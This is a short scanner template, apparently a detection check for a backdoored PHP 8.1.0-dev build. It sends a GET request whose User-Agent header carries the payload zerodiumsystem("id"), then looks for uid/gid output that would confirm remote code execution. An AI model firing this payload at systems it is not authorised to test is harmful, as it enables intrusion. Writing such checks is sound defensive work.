id: PHP-Version-leads-to-RCE
info:
  author: 25
  name: PHP 8.1.0-dev
  severity: high
  tags: rce
requests:
- headers:
    User-Agent: zerodiumsystem("id");
  matchers:
  - part: body
    regex:
    - uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+
    type: regex
  method: GET
  path:
  - '{{BaseURL}}'
